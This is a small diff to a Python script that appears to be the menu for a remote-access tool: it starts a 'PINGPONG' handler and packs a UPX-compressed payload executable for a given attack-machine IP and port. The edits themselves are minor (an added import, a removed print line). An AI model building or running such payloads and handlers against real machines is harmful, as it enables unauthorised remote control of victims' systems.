@@ -4,6 +4,7 @@
 # @Author    :D0WE1L1N\
 import handler
 import payload.payload_packer
+import json
 #print的基本函数
 def print_error(str):
     print('\033[0;31m'+ str + '\033[0m')
@@ -57,7 +58,6 @@ def sub_main():
                     print_error("handler>[-]port input error")
             # payload.payload_packer.pack("_basic_conn.py", ip, port, False)
             payload.payload_packer.pack("PINGPONG_payload/PINGPONG_payload", ip, port, True, upx_dir)
-            print("THE PAYLOAD IS IN ./payload/upload_payload/payload.exe")
     if choice == "PING":
         print("PONG")
         sub_main()
@@ -70,7 +70,7 @@ def main():
     print_normal("Active choice:")
     print_normal("1) Start a PINGPONG handler")
     print_normal("2) Make payload(s)")
-    # print("3) Settings")
+    # print_normal("3) Settings")
     sub_main()
 def startserver():
     ip = input("handler>[*]Please input the IP for the attack machine(blank for 127.0.0.1)>")
